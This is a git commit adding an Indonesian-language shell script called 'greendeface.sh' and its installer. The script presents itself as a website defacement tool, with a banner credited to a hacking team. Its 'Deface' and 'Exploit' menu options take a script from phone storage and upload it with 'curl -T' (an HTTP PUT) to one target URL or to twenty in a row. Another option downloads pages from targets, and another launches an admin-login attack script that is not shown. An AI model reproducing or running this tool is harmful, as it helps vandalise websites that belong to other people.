97de8aba74228d8751d170e95632b4a877fa08cb
greenzombies123 <52916652+greenzombies123@users.noreply.github.com>
2019-08-22 11:43:21 +0700

    Add files via upload

---
+++ greendeface.sh
@@ -0,0 +1,341 @@
+#usr/bin/sh
+#ngapain liat-liat Tod :p
+#cuman tools sederhana tod :p
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+echo 
+echo
+echo                                                   
+echo $red" @@@@@@@@  @@@@@@@   @@@@@@@@  @@@@@@@@  @@@  @@@  "
+sleep 1
+echo $red"@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  "
+sleep 1
+echo $red"!@@        @@!  @@@  @@!       @@!       @@!@!@@@  "
+sleep 1
+echo $red"!@!        !@!  @!@  !@!       !@!       !@!!@!@!  "
+sleep 1
+echo $white"!@! @!@!@  @!@!!@!   @!!!:!    @!!!:!    @!@ !!@!  "
+sleep 1
+echo $white"!!! !!@!!  !!@!@!    !!!!!:    !!!!!:    !@!  !!!  "
+sleep 1
+echo $white":!!   !!:  !!: :!!   !!:       !!:       !!:  !!!  "
+sleep 1
+echo $white":!:   !::  :!:  !:!  :!:       :!:       :!:  !:!  "
+echo $white" ::: ::::  ::   :::   :: ::::   :: ::::   ::   ::  "
+echo $white" :: :: :    :   : :  : :: ::   : :: ::   ::    :   "
+echo                                         
+echo
+echo $red"                                                                    "
+echo $red"@@@@@@@@   @@@@@@   @@@@@@@@@@   @@@@@@@   @@@  @@@@@@@@   @@@@@@   "
+echo $red"@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@   "
+echo $red"     @@!  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@!       !@@       "
+echo $red"    !@!   !@!  @!@  !@! !@! !@!  !@   @!@  !@!  !@!       !@!       "
+echo $red"   @!!    @!@  !@!  @!! !!@ @!@  @!@!@!@   !!@  @!!!:!    !!@@!!    "
+echo $white"  !!!     !@!  !!!  !@!   ! !@!  !!!@!!!!  !!!  !!!!!:     !!@!!!   "
+echo $white" !!:      !!:  !!!  !!:     !!:  !!:  !!!  !!:  !!:            !:!  "
+echo $white":!:       :!:  !:!  :!:     :!:  :!:  !:!  :!:  :!:           !:!   "
+echo $white" :: ::::  ::::: ::  :::     ::    :: ::::   ::   :: ::::  :::: ::   "
+echo $white": :: : :   : :  :    :      :    :: : ::   :    : :: ::   :: : :    "
+echo              
+echo
+echo
+sleep 1
+figlet -f smshadow "GREENDEFACE"
+echo $indigo
+date
+echo $red"___________________________________________________"
+echo $red" [+]Author by	: GREEN ZOMBIES "
+echo $red" [+]Team        : AGEN SEA		"
+echo $red" [+]Thanks to      : MR_81"
+echo $red" [+]Thanks to      : MR_ARIANIMOUS"
+echo $white" [+]Thanks to      : MR_XZ.6"
+echo $white" [+]Thanks to      : B3kT0509"
+echo $white" [+]Thanks to      : MR_VIRUS"
+echo $white" [+]Thanks to      : MR_DENIMNEWBIE"
+echo $white"___________________________________________________"
+sleep 2
+echo $red"___________________________________________________"
+echo $red"	~"$red"{"$white"A"$red"}"$white".Deface"$red"		{"$white"Q"$red"}"$white"Quit "
+echo $red"	~"$red"{"$white"B"$red"}"$white".Takescript"$red"		{"$white"I"$red"}"$white"Info "
+echo $red"	~"$red"{"$white"C"$red"}"$white".Exploit"$red
+echo $red"	~"$red"{"$white"D"$red"}"$white".AdminLogin"$red
+echo $white"___________________________________________________"
+echo $red"	~"$red"{"$white"T"$red"}"$white".TUTORIAL"$red
+echo $white"___________________________________________________"
+echo $white"GREENZOMBIES"$red" ~zombies"$white
+read -p " $ "  apaan
+echo
+clear
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo
+echo $red" @@@@@@@@  @@@@@@@   @@@@@@@@  @@@@@@@@  @@@  @@@  "
+echo $red"@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  "
+sleep 1
+echo $red"!@@        @@!  @@@  @@!       @@!       @@!@!@@@  "
+sleep 1
+echo $red"!@!        !@!  @!@  !@!       !@!       !@!!@!@!  "
+sleep 1
+echo $white"!@! @!@!@  @!@!!@!   @!!!:!    @!!!:!    @!@ !!@!  "
+sleep 1
+echo $white"!!! !!@!!  !!@!@!    !!!!!:    !!!!!:    !@!  !!!  "
+sleep 1
+echo $white":!!   !!:  !!: :!!   !!:       !!:       !!:  !!!  "
+sleep 1
+echo $white":!:   !::  :!:  !:!  :!:       :!:       :!:  !:!  "
+echo $white" ::: ::::  ::   :::   :: ::::   :: ::::   ::   ::  "
+echo $white" :: :: :    :   : :  : :: ::   : :: ::   ::    :   "
+echo
+echo
+echo $red"                                                                    "
+echo $red"@@@@@@@@   @@@@@@   @@@@@@@@@@   @@@@@@@   @@@  @@@@@@@@   @@@@@@   "
+echo $red"@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@   "
+echo $red"     @@!  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@!       !@@       "
+echo $red"    !@!   !@!  @!@  !@! !@! !@!  !@   @!@  !@!  !@!       !@!       "
+echo $red"   @!!    @!@  !@!  @!! !!@ @!@  @!@!@!@   !!@  @!!!:!    !!@@!!    "
+echo $white"  !!!     !@!  !!!  !@!   ! !@!  !!!@!!!!  !!!  !!!!!:     !!@!!!   "
+echo $white" !!:      !!:  !!!  !!:     !!:  !!:  !!!  !!:  !!:            !:!  "
+echo $white":!:       :!:  !:!  :!:     :!:  :!:  !:!  :!:  :!:           !:!   "
+echo $white" :: ::::  ::::: ::  :::     ::    :: ::::   ::   :: ::::  :::: ::   "
+echo $white": :: : :   : :  :    :      :    :: : ::   :    : :: ::   :: : :    "
+echo
+echo
+echo
+sleep 1
+figlet -f smshadow "DEFACE"
+echo $red "Masukan"$white" Target !!!! "
+echo $red"GREENZOMBIES"$cyan" ~zombies"$white
+read -p " $ "  target
+echo $red "Masukan Script !!!! "
+echo $whi8te "GREENZOMBIES"$cyan" zombies"$white
+read -p " $ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "[+]>>>>> = $target/$script "
+echo $white"["$red"B"$white"]"$red"back "$white"["$red"Q"$white"]"$red"Quit"
+read -p "[B/Q] : " back
+fi
+
+clear
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo $red" @@@@@@@@  @@@@@@@   @@@@@@@@  @@@@@@@@  @@@  @@@  "
+echo $red"@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  "
+sleep 1
+echo $red"!@@        @@!  @@@  @@!       @@!       @@!@!@@@  "
+sleep 1
+echo $red"!@!        !@!  @!@  !@!       !@!       !@!!@!@!  "
+sleep 1
+echo $white"!@! @!@!@  @!@!!@!   @!!!:!    @!!!:!    @!@ !!@!  "
+sleep 1
+echo $white"!!! !!@!!  !!@!@!    !!!!!:    !!!!!:    !@!  !!!  "
+sleep 1
+echo $white":!!   !!:  !!: :!!   !!:       !!:       !!:  !!!  "
+sleep 1
+echo $white":!:   !::  :!:  !:!  :!:       :!:       :!:  !:!  "
+echo $white" ::: ::::  ::   :::   :: ::::   :: ::::   ::   ::  "
+echo $white" :: :: :    :   : :  : :: ::   : :: ::   ::    :   "
+echo
+echo
+echo $red"                                                                    "
+echo $red"@@@@@@@@   @@@@@@   @@@@@@@@@@   @@@@@@@   @@@  @@@@@@@@   @@@@@@   "
+echo $red"@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@   "
+echo $red"     @@!  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@!       !@@       "
+echo $red"    !@!   !@!  @!@  !@! !@! !@!  !@   @!@  !@!  !@!       !@!       "
+echo $red"   @!!    @!@  !@!  @!! !!@ @!@  @!@!@!@   !!@  @!!!:!    !!@@!!    "
+echo $white"  !!!     !@!  !!!  !@!   ! !@!  !!!@!!!!  !!!  !!!!!:     !!@!!!   "
+echo $white" !!:      !!:  !!!  !!:     !!:  !!:  !!!  !!:  !!:            !:!  "
+echo $white":!:       :!:  !:!  :!:     :!:  :!:  !:!  :!:  :!:           !:!   "
+echo $white" :: ::::  ::::: ::  :::     ::    :: ::::   ::   :: ::::  :::: ::   "
+echo $white": :: : :   : :  :    :      :    :: : ::   :    : :: ::   :: : :    "
+echo
+echo
+echo
+sleep 1
+figlet -f smshadow "GREENDEFACE"
+echo $red "Masukan Target !!!! "
+echo $white "GREENZOMBIES"$red"zombies"$white
+read -p " $ "  target
+echo $white "Simpan dengan nama??(ex: script.html)"
+echo $white "GREENZOMBIES"$red" zombies"$white
+read -p " $ " simpan
+curl -o $simpan $target
+echo $red"["$white"B"$red"]"$white"back "$red"["$white"Q"$red"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+clear
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+echo $red" @@@@@@@@  @@@@@@@   @@@@@@@@  @@@@@@@@  @@@  @@@  "
+sleep 1
+echo $red"@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  "
+sleep 1
+echo $red"!@@        @@!  @@@  @@!       @@!       @@!@!@@@  "
+sleep 1
+echo $red"!@!        !@!  @!@  !@!       !@!       !@!!@!@!  "
+sleep 1
+echo $white"!@! @!@!@  @!@!!@!   @!!!:!    @!!!:!    @!@ !!@!  "
+sleep 1
+echo $white"!!! !!@!!  !!@!@!    !!!!!:    !!!!!:    !@!  !!!  "
+sleep 1
+echo $white":!!   !!:  !!: :!!   !!:       !!:       !!:  !!!  "
+sleep 1
+echo $white":!:   !::  :!:  !:!  :!:       :!:       :!:  !:!  "
+echo $white" ::: ::::  ::   :::   :: ::::   :: ::::   ::   ::  "
+echo $white" :: :: :    :   : :  : :: ::   : :: ::   ::    :   "
+echo                                         
+echo
+echo $red"                                                                    "
+echo $red"@@@@@@@@   @@@@@@   @@@@@@@@@@   @@@@@@@   @@@  @@@@@@@@   @@@@@@   "
+echo $red"@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@   "
+echo $red"     @@!  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@!       !@@       "
+echo $red"    !@!   !@!  @!@  !@! !@! !@!  !@   @!@  !@!  !@!       !@!       "
+echo $red"   @!!    @!@  !@!  @!! !!@ @!@  @!@!@!@   !!@  @!!!:!    !!@@!!    "
+echo $white"  !!!     !@!  !!!  !@!   ! !@!  !!!@!!!!  !!!  !!!!!:     !!@!!!   "
+echo $white" !!:      !!:  !!!  !!:     !!:  !!:  !!!  !!:  !!:            !:!  "
+echo $white":!:       :!:  !:!  :!:     :!:  :!:  !:!  :!:  :!:           !:!   "
+echo $white" :: ::::  ::::: ::  :::     ::    :: ::::   ::   :: ::::  :::: ::   "
+echo $white": :: : :   : :  :    :      :    :: : ::   :    : :: ::   :: : :    "
+echo       
+echo
+sleep 1
+figlet -f smshadow "EXPLOIT"
+echo "### ctrl + c to quit ###"
+echo "Masukan Script !!!!"
+read -p " ╰─$ " script
+echo "Masukan Target1 !!!!"
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"+"$cyan"]"$red"$target1/$script"
+echo "Masukan Target2 !!!!"
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo "Masukan Target3 !!!!"
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $cyan"["$green"+"$cyan"]"$red"$target3/$script"
+echo "Masukan Target4 !!!!"
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $cyan"["$green"+"$cyan"]"$red"$target4/$script"
+echo "Masukan Target5 !!!!"
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $cyan"["$green"+"$cyan"]"$red"$target5/$script"
+echo "Masukan Target6 !!!!"
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$red"$target6/$script"
+echo "Masukan Target7 !!!!"
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$red"$target7/$script"
+echo "Masukan Target8 !!!!"
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo $cyan"["$green"+"$cyan"]"$red"$target8/$script"
+echo "Masukan Target9 !!!!"
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo $cyan"["$green"+"$cyan"]"$red"$target9/$script"
+echo "Masukan Target10 !!!! "
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo $cyan"["$green"+"$cyan"]"$red"$target10/$script"
+echo "Masukan Target11 !!!! "
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo $cyan"["$green"+"$cyan"]"$red"$target11/$script"
+echo "Masukan Target12 !!!! "
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo $cyan"["$green"+"$cyan"]"$red"$target12/$script"
+echo "Masukan Target13 !!!! "
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo $cyan"["$green"+"$cyan"]"$red"$target13/$script"
+echo "Masukan Target14 !!!! "
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo $cyan"["$green"+"$cyan"]"$red"$target14/$script"
+echo "Masukan Target15 !!!! "
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo $cyan"["$green"+"$cyan"]"$red"$target15/$script"
+echo "Masukan Target16 !!!! "
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo $cyan"["$green"+"$cyan"]"$red"$target16/$script"
+echo "Masukan Target17 !!!! "
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo $cyan"["$green"+"$cyan"]"$red"$target17/$script"
+echo "Masukan Target18 !!!! "
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo $cyan"["$green"+"$cyan"]"$red"$target18/$script"
+echo "Masukan Target19 !!!! "
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo $cyan"["$green"+"$cyan"]"$red"$target19/$script"
+echo "Masukan Target20 !!!! "
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo $red"["$white"+"$red"]"$white"$target20/$script"
+echo $white"["$red"B"$white"]"$red"back "$white"["$red"Q"$white"]"$red"Quit"
+read -p "[B/Q] : " back
+fi
+
+clear
+if [ $apaan = "D" ] || [ $apaan = "d" ]
+then
+python2 zombiedeface.py
+exit
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo $red"___________________________________________________"
+echo $red" [+]Author by : GREEN ZOMBIES "
+echo $red" [+]Team        : AGEN SEA            "
+echo $red" [+]Thanks to      : MR_81"
+echo $red" [+]Thanks to      : MR_ARIANIMOUS"
+echo $white" [+]Thanks to      : MR_XZ.6"
+echo $white" [+]Thanks to      : B3kT0509"
+echo $white" [+]Thanks to      : MR_VIRUS"
+echo $white" [+]Thanks to      : MR_DENIMNEWBIE"
+echo $white"___________________________________________________"
+echo $red"["$white"B"$red"]"$white"back "$red"["$white"Q"$red"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+cat tutorial.txt
+exit
+fi
+
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo " :) "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh greendeface.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
---
+++ install.sh
@@ -0,0 +1,4 @@
+apt upgrade && apt update -y
+apt install python2
+apt install figlet
+apt install curl
